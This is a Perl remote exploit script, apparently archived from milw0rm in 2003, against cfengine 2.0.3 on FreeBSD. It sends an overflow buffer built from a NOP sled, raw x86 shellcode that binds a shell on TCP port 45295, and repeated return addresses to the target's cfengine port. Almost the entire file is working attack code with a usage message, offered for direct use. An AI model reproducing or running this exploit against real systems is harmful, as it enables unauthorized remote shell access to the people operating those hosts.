#!/usr/bin/perl -s
# kokaninATdtors.net / cfengine2-2.0.3 from freebsd ports 26/sep/2003.
# forking portbind shellcode port=0xb0ef(45295) by eSDee
# bug discovered by nick cleaton, tested on FreeBSD 4.8-RELEASE

use IO::Socket;
if(!$ARGV[1])
{ print "usage: ./DSR-cfengine.pl <host> <port> (default cfengine is 5308)\n"; exit(-1); }

$host = $ARGV[0];
$port = $ARGV[1];
$nop = "\x90";
$ret = pack("l",0xbfafe3dc);
$shellcode = 
"\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0".
"\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02".
"\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80".
"\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57".
"\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89".
"\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50".
"\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80".
"\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56".
"\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd".
"\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f".
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b".
"\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80".
"\xeb\x9a";


$buf = $nop x 2222 . $shellcode . $ret x 500;

$socket = new IO::Socket::INET ( 
Proto  => "tcp",
PeerAddr => $host,
PeerPort => $port, 
);

die "unable to connect to $host:$port ($!)\n" unless $socket;

sleep(1); #you might have to adjust this on slow connections
print $socket $buf;

close($socket);


# milw0rm.com [2003-09-27]
